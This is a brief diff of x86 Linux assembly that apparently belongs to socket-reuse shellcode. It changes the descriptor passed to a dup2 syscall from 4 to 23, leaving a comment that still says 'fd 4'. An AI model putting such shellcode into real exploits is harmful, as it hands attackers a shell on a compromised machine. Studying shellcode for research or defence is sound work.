@@ -6,7 +6,7 @@ _start:
         xor edx, edx
         xor ecx, ecx
 		/* fd 4*/
-        lea ebx, [edx+4] 
+        lea ebx, [edx+23] 
         lea eax, [edx+63]
         int 0x80
         /* dup2(2, 1) */
